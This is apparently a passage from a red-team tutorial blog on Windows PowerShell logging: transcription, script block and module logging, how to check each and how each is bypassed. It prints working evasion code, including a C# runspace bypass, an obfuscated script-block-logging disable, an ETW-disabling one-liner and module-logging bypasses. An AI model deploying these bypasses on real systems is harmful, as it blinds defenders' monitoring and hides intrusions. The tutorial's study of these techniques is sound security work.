$TEMPBypassPath = "Temp=C:\windows\temp"
$TMPBypassPath = "TMP=C:\windows\temp"

#Add the to the list of vars
$EnvVarsExceptTemp += $TEMPBypassPath
$EnvVarsExceptTemp += $TMPBypassPath

#Define the start params
$StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }
$StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties

#Start a new powershell using the new params
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $CMDLine
ProcessStartupInformation = $StartParams
}
```

<figure><img src="/images/site/posts/DefenseEvasion/def24.png" alt=""></figure>

## PowerShell Logging

PowerShell logging is the process of recording activities within PowerShell sessions, such as commands executed, scripts run, and their outputs or execution details. It is designed to support auditing, debugging, and security monitoring in Windows environments. The three primary logging types : 

* Transcription
* Script Block Logging
* Module Logging 

Each serves distinct purposes, capturing different levels of detail about PowerShell activities, so let us talk about them and their bypasses and how to configure them.

### PowerShell Transcription

The Transcription loging records both input (commands typed) and output (responses shown) of PowerShell sessions, like a session transcript.

Let's configure it from Local Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to PowerShell Transcription

<figure><img src="/images/site/posts/DefenseEvasion/def25.png" alt=""></figure>

Let's see how this work , you can run this script to know the Transcription are on or not

```powershell
$transcriptionSettings = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue
if ($transcriptionSettings -and $transcriptionSettings.EnableTranscripting -eq 1) {
    Write-Host "Transcription logging is enabled."
    if ($transcriptionSettings.OutputDirectory) {
        Write-Host "Log directory: $($transcriptionSettings.OutputDirectory)"
    } else {
        Write-Host "Log directory: Default (User's Documents folder, typically $HOME\Documents)"
    }
    if ($transcriptionSettings.EnableInvocationHeader -eq 1) {
        Write-Host "Invocation headers are included in logs."
    }
} else {
    Write-Host "Transcription logging is not enabled via Group Policy."
}
```

Let's see what this will do

<figure><img src="/images/site/posts/DefenseEvasion/def26.png" alt=""></figure>


you can't get the script content here you just get the command and the ouput like a session

>what is the invokation headers , [Patrick](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) explain them here with those screenshots :
>
>Transcription Logging without invokation headers activated:
><figure><img src="/images/site/posts/DefenseEvasion/def27.png" alt=""></figure>
>The second one shows logging with invokation headers activated:
><figure><img src="/images/site/posts/DefenseEvasion/def28.png" alt=""></figure>
{: .prompt-info }

#### PowerShell Transcription Bypass

This one Doesn't have many resources but there is a one [here](https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass) by [jann lemm](https://avantguard.io/en/blog/author/jann-lemm) , The idea behinde this bypass is the Transcription only check one thing to determine if it's enabled and it's the PowerShell registry (**HKEY\_LOCAL\_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription)** or Group Policy to check if **EnableTranscripting is 1**

To change the key we need an administrative privileges so what should we do ?

jann lemm said , If the registry key EnableTranscripting is set to 0 while in an active PowerShell session, the transcript is continued and no bypass is possible, even though the cached value is set to 0. But if these changes to the field are made before a custom PowerShell runspace is opened, the runspace will use the cached (and modified) values, effectively allowing a bypass of the three logging mechanisms by an unprivileged user.

For the first time i don't understand it , So i will try to explain this more for you in Practical way like the above

So Let's see how the jann lemm bypass work and how the regular exe work to work Hello World

```c#
// Hello_World.cs 

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program
{
    static void Main(string[] args)
    {
        // Create a default runspace
        using (Runspace runspace = RunspaceFactory.CreateRunspace())
        {
            runspace.Open();

            // Create a pipeline
            using (Pipeline pipeline = runspace.CreatePipeline())
            {
                // Add the command to print "Hello World"
                pipeline.Commands.AddScript("Write-Output 'Hello World'");

                // Execute the pipeline and get results
                var results = pipeline.Invoke();

                // Display results
                foreach (PSObject result in results)
                {
                    Console.WriteLine(result.ToString());
                }
            }

            runspace.Close();
        }
    }
}

            rs.Close();
        }
    }
}
```

```c#
// Hello_Bypass.cs # https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass

using System;
using System.Reflection;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;

namespace CustomRunspace
{
    class CustomRunspace
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();

            // Transcription Logging Bypass
            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;
            ConcurrentDictionary<string, Dictionary<string, object>> value = (ConcurrentDictionary<string, Dictionary<string, object>>)rs.GetType().Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings", bf).GetValue(null);
            Dictionary<string, object> dic = new Dictionary<string, object>();
            dic.Add("EnableTranscripting", "0");
            value.GetOrAdd("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", dic);

            // Open Runspace
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddCommand("Write-Output").AddArgument("Hello World");

            Collection<PSObject> results = ps.Invoke();
            foreach (var result in results)
            {
                Console.WriteLine(result);
            }

            rs.Close();
        }
    }
}
```

> * Runspace (short for "runtime space") is an **isolated execution** environment in PowerShell that encapsulates the state and configuration needed to run PowerShell commands or scripts. **It includes session state** (e.g., variables, functions, modules), the PowerShell engine, and the host interface for input/output so it allow PowerShell to execute commands in a controlled, isolated manner, supporting both interactive sessions (like powershell.exe) and programmatic execution
> * you can compile the cs files with this command :
>```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:Transcription_Bypass.exe CustomRunspace.cs
```
{: .prompt-tip }

Let's see what we can do

<figure><img src="/images/site/posts/DefenseEvasion/def29.png" alt=""></figure>

So , When we run the hello\_world executable the transcription loggin save the commands that in the c# script and the Transcription file created with 53504 Event-ID

```powershell
<?xml version="1.0"?>
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
  <EventID>53504</EventID> 
  <Version>1</Version> 
  <Level>4</Level> 
  <Task>111</Task> 
  <Opcode>10</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime="2025-07-24T01:33:13.9730709Z" /> 
  <EventRecordID>57</EventRecordID> 
  <Correlation ActivityID="{3aa23c01-fc70-0000-906c-a23a70fcdb01}" /> 
  <Execution ProcessID="7140" ThreadID="3408" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DESKTOP-INN3ESD</Computer> 
  <Security UserID="S-1-5-21-2346707970-763624724-545999952-1001" /> 
  </System>
- <EventData>
  <Data Name="param1">7140</Data> 
  <Data Name="param2">DefaultAppDomain</Data> 
  </EventData>
  </Event>
```

Let's run the Bypass script with the same Hello\_World function

<figure><img src="/images/site/posts/DefenseEvasion/def30.png" alt=""></figure>

So, the difference here is that there is no log file. Because the new file runs the custom runspace without any transcription log file.

### Script Block Logging

Records the code executed, including scripts, functions, and commands, whether invoked interactively or through automation.

Let's configure it from Local Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to Powershell script block logging

<figure><img src="/images/site/posts/DefenseEvasion/def31.png" alt=""></figure>

Let's see how this work , you can run this script to know the Script block logging are on or not

```powershell
$scriptBlockLogging = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
if ($scriptBlockLogging -and $scriptBlockLogging.EnableScriptBlockLogging -eq 1) {
    Write-Host "Script Block Logging is enabled."
    if ($scriptBlockLogging.EnableScriptBlockInvocationLogging -eq 1) {
        Write-Host "Script block invocation logging is also enabled."
    } else {
        Write-Host "Script block invocation logging is not enabled."
    }
} else {
    Write-Host "Script Block Logging is not enabled."
}
```

let's start and after that start enum the event's with

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 100 | Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, @{Name="ScriptBlock";Expression={$_.Properties[2].Value}} | Format-List
```

<figure><img src="/images/site/posts/DefenseEvasion/def32.png" alt=""></figure>

>* The Script block get the script content not only the input and the output in the prompt
>
>* [PowerShell 5.0 auto logging](https://www.robwillis.info/2019/10/everything-you-need-to-know-to-get-started-logging-powershell) : By default, PowerShell does not log everything and to get the most out of the logging capabilities there are additional policies that need to be enabled. However, it is worth noting that starting with PowerShell 5.0, anything that is determined as ***suspicious*** by AMSI (Antimalware Scan Interface), will automatically log a Script block/4104 event with a level of ***Warning***. [If script block logging is explicitly disabled, these events will not be logged.](https://web.archive.org/web/20180827195417/https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html)
{: .prompt-info }


#### ScriptBlock Bypass

Like the previous bypasses , The user can change his powershell session evniroments and the cached setting so [cobbr](https://web.archive.org/web/20190417131155/https://cobbr.io/ScriptBlock-Logging-Bypass.html) notice that and made this [script](https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407) for us to disable the scriptblock logging

```powershell
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
If ($GroupPolicyField) {
    $GroupPolicyCache = $GroupPolicyField.GetValue($null)
    If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
    }
    $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
    $val.Add('EnableScriptB'+'lockLogging', 0)
    $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
    $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
}
```

Then test it with the count of the logs

```powershell
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
```

<figure><img src="/images/site/posts/DefenseEvasion/def33.png" alt=""></figure>

>Our bypass script will still being logged cuz of [Event Tracing for Windows](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101) you can use this [script here](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32) to disable it
>```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```
{: .prompt-tip }


### Module Logging

Records pipeline execution details for <span style="color:yellow">cmdlets from specified modules</span>, including variable initialization and command invocations.

Let's configure it from Local Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to Module logging

<figure><img src="/images/site/posts/DefenseEvasion/def34.png" alt=""></figure>

Let's see how this work , you can run this script to know the Module logging are on or not

```powershell
$moduleLogging = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue
if ($moduleLogging -and $moduleLogging.EnableModuleLogging -eq 1) {
    Write-Host "Module Logging is enabled."
    $moduleNames = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -ErrorAction SilentlyContinue
    if ($moduleNames) {
        Write-Host "Modules being logged:"
        $moduleNames.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' -and $_.Name -ne 'PSParentPath' } | ForEach-Object {
            Write-Host " - $($_.Name) = $($_.Value)"
        }
    } else {
        Write-Host "No specific modules are configured for logging."
    }
} else {
    Write-Host "Module Logging is not enabled."
}
```

let's start and after that start enum the event's with


```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 100 | Where-Object { $_.Id -eq 4103 } | Select-Object TimeCreated, @{Name="Command";Expression={$_.Properties[1].Value}}, @{Name="Module";Expression={$_.Properties[0].Value}} | Format-List
```

<figure><img src="/images/site/posts/DefenseEvasion/def35.png" alt=""></figure>



#### Module Logging Bypass

Let's start with a simple event like print a string with write-host

<figure><img src="/images/site/posts/DefenseEvasion/def36.png" alt=""></figure>


This simple command trigger 4 events let's discribe them

* PSConsoleHostReadLine : This log appears when you enter the command, as the PSReadLine module handles input reading, providing features like auto-completion and syntax highlighting.


```powershell
<?xml version="1.0"?>
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
  <EventID>4103</EventID> 
  <Version>1</Version> 
  <Level>4</Level> 
  <Task>106</Task> 
  <Opcode>20</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime="2025-07-20T23:17:27.8187082Z" /> 
  <EventRecordID>285</EventRecordID> 
  <Correlation ActivityID="{188710b5-f9b6-0000-6a3a-8718b6f9db01}" /> 
  <Execution ProcessID="2236" ThreadID="7736" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DESKTOP-47K3P38</Computer> 
  <Security UserID="S-1-5-21-3540393959-771636146-431249527-1001" /> 
  </System>
- <EventData>
  <Data Name="ContextInfo">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 17 Command Name = PSConsoleHostReadLine Command Type = Function Script Name = Command Path = Sequence Number = 46 User = DESKTOP-47K3P38\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> 
  <Data Name="UserData" /> 
  <Data Name="Payload">CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"</Data> 
  </EventData>
  </Event>
```

* Write-Host : This directly logs the command you executed, showing the invocation and the parameter "@N1NJ10 was here".

```powershell
<?xml version="1.0"?>
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
  <EventID>4103</EventID> 
  <Version>1</Version> 
  <Level>4</Level> 
  <Task>106</Task> 
  <Opcode>20</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime="2025-07-20T23:17:27.8234848Z" /> 
  <EventRecordID>286</EventRecordID> 
  <Correlation ActivityID="{188710b5-f9b6-0002-d13b-8718b6f9db01}" /> 
  <Execution ProcessID="2236" ThreadID="7736" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DESKTOP-47K3P38</Computer> 
  <Security UserID="S-1-5-21-3540393959-771636146-431249527-1001" /> 
  </System>
- <EventData>
  <Data Name="ContextInfo">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 18 Command Name = Write-Host Command Type = Cmdlet Script Name = Command Path = Sequence Number = 48 User = DESKTOP-47K3P38\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> 
  <Data Name="UserData" /> 
  <Data Name="Payload">CommandInvocation(Write-Host): "Write-Host" ParameterBinding(Write-Host): name="Object"; value="@N1NJ10 was here"</Data> 
  </EventData>
  </Event>
```

* Out-Default : This is likely logged when the prompt is displayed after your command, as PowerShell uses Out-Default to handle the prompt output, even if Write-Host doesn't produce pipeline output.


```powershell
<?xml version="1.0"?>
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
  <EventID>4103</EventID> 
  <Version>1</Version> 
  <Level>4</Level> 
  <Task>106</Task> 
  <Opcode>20</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime="2025-07-20T23:17:27.8238426Z" /> 
  <EventRecordID>287</EventRecordID> 
  <Correlation ActivityID="{188710b5-f9b6-0002-d03b-8718b6f9db01}" /> 
  <Execution ProcessID="2236" ThreadID="7736" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DESKTOP-47K3P38</Computer> 
  <Security UserID="S-1-5-21-3540393959-771636146-431249527-1001" /> 
  </System>
- <EventData>
  <Data Name="ContextInfo">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 18 Command Name = Command Type = Script Script Name = Command Path = Sequence Number = 50 User = DESKTOP-47K3P38\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> 
  <Data Name="UserData" /> 
  <Data Name="Payload">CommandInvocation(Out-Default): "Out-Default"</Data> 
  </EventData>
  </Event>
```

* Set-StrictMode : This is called by the PSReadLine module, possibly as part of its configuration or internal operations, **and is captured because module logging is enabled for the session. ( So this mean if u call any cmdlet this Event log will be triggered )**

```powershell
<?xml version="1.0"?>
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
  <EventID>4103</EventID> 
  <Version>1</Version> 
  <Level>4</Level> 
  <Task>106</Task> 
  <Opcode>20</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime="2025-07-20T23:17:27.8268015Z" /> 
  <EventRecordID>288</EventRecordID> 
  <Correlation ActivityID="{188710b5-f9b6-0000-af3a-8718b6f9db01}" /> 
  <Execution ProcessID="2236" ThreadID="7736" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DESKTOP-47K3P38</Computer> 
  <Security UserID="S-1-5-21-3540393959-771636146-431249527-1001" /> 
  </System>
- <EventData>
  <Data Name="ContextInfo">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 20 Command Name = Set-StrictMode Command Type = Cmdlet Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1 Command Path = Sequence Number = 52 User = DESKTOP-47K3P38\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> 
  <Data Name="UserData" /> 
  <Data Name="Payload">CommandInvocation(Set-StrictMode): "Set-StrictMode" ParameterBinding(Set-StrictMode): name="Off"; value="True"</Data> 
  </EventData>
  </Event>
```

So the write-host cmdlet make 3 event logs ( Write-Host , Out-Default , Set-StrictMode ) so if we success to disable the Module logging we will see 1 event , Let's do it

In this blog by [HUBBL3](https://bc-security.org/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/) , We can see that it's not possible to completely block module logging for all modules (even if we use `*` to include all modules in logging). However, it is possible to bypass logging for specific cmdlets

>* When the [**LogPipelineExecutionDetails**](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events)property value is `$true`, Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer. The setting is effective only in the current session.
>* A PowerShell snap-in is a .NET assembly (typically a DLL) that contains a collection of cmdlets, providers, and sometimes other components that extend PowerShell’s functionality.
>* The "4103" Event-ID is for the Module loggin
>* Path for the Events : Event Viewer -> Applications and Services -> Microsoft -> Windows -> PowerShell -> Operational
{: .prompt-info }

```powershell
# Recon
(Get-Command Write-Host).module
Get-PSSnapin

# Bypass 1 
$module = Get-Module Microsoft.PowerShell.Utility
$module.LogPipelineExecutionDetails = $false
$Snapin = Get-PSSnapin Microsoft.PowerShell.Core
$Snapin.LogPipelineExecutionDetails = $false

# Bypass 2 

$GroupPolicy =[ReF].assembly.GetType('System.Management.Automation.Utils').GetFielD('cachedGroupPolicySettings','NonPublic,Static').GetValue($nULL);
$val=[Collections.Generic.Dictionary[String,System.Object]]::new();
$Val.Add('EnableModuleLogging',0);
$Val.add('ModuleNames', '');
$GroupPolicy['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']=$VaL
Import-Module Microsoft.Powershell.Utility -Force

# Bypass 3 

$Cmd = [System.Management.Automation.CmdletInfo]::new("Write-Host", [Microsoft.PowerShell.Commands.WriteHostCommand])

# Test 

Write-Host "@N1NJ10 was here"

# Test for Bypass 3 

& $Cmd "@N1NJ10 was here"
```

Let's see what event that the first bypass will trigger

With the logic we can count them without any execute , They are 4 lines 2 of them execute a change in the session without any output so there will be

* 4 From the PSConsoleHostReadLine
* 2 From an unknown Events ( Like the Write-Host ... )

Let's see

<figure><img src="/images/site/posts/DefenseEvasion/def37.png" alt=""></figure>

As we expect there are 6 events trigger ( 2 of them are warrning with Event-ID 4104 )

>* Don't Forget to Clear the logs after some operations to see what the new operations new logs
>* If you use script block you will get 2 events
{: .prompt-tip }

<figure><img src="/images/site/posts/DefenseEvasion/def38.png" alt=""></figure>

So , Let's test to see if this work

<figure><img src="/images/site/posts/DefenseEvasion/def39.png" alt=""></figure>

Great , It worked the Write-Host now tigger 1 Event log ( PSConsoleHostReadLine )

## Resources

I don't talk about automated tools because you can find many writeups talking about them but in the future, I will update this post with some tools that I use in my engagement and some scenarios

I will provide you with some of these resources enjoy :

* [Amsi.fail](https://amsi.fail/)
* [Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
* [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
* [PowerShell get information about AntiVirus](https://answers.microsoft.com/en-us/windowserver/forum/all/powershell-get-information-about-antivirus/9207ebfa-ff97-48f0-b133-dde4cfd4abca)
* [Beginners-Guide-to-Obfuscation](https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation/blob/main/Exercise%202/Sample_1.ps1)
* [Evading Detection: A Beginner's Guide to Obfuscation - 2022](https://www.youtube.com/watch?v=wvKwk1wcXvM&list=PLqyUgadpThTJVR6I3FQSBE3mLElxQkcbh&t=1457s)
* [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)
* [the hacker recipes obfuscation](https://www.thehacker.recipes/evasion/av/obfuscation)
* [AMSITrigger](https://github.com/RythmStick/AMSITrigger)
* [gocheck](https://github.com/gatariee/gocheck)
* [AMSI BYPASS AND EVASION](https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/)
* [AMSI Bypass Memory Patch Technique in 2024](https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)
* [amsi-bypass-methods](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
* [lolbas-project](https://lolbas-project.github.io/)
* [The Internals of AppLocker](https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html)
* [Windows Applocker Policy – A Beginner’s Guide](https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/)
* [persistence-amsi](https://pentestlab.blog/2021/05/17/persistence-amsi/)
* [Constrained Language constrain?](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/#what-does-constrained-language-constrain) - [What is PowerShell Constrained Language?](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)
* [InstallUtil](https://www.ired.team/offensive-security/code-execution/t1118-installutil)
* [WhiteListEvasion](https://github.com/khr0x40sh/WhiteListEvasion)
* [NetCat64](https://github.com/vinsworldcom/NetCat64/releases)
* [CLM-Bypass](https://sp00ks-git.github.io/posts/CLM-Bypass/)
* [AaronLocker](https://github.com/microsoft/AaronLocker)
* [one-thousand-and-one-application-blocks](https://blog.improsec.com/tech-blog/one-thousand-and-one-application-blocks)
* [sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
* [Stracciatella](https://github.com/mgeeky/Stracciatella)
* Manual Pages 